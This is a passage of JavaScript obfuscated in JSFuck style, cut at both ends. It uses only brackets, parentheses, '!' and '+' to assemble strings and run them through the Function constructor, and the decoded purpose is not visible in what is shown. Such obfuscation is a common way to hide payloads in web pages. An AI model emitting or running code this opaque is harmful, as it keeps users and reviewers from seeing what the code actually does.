]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+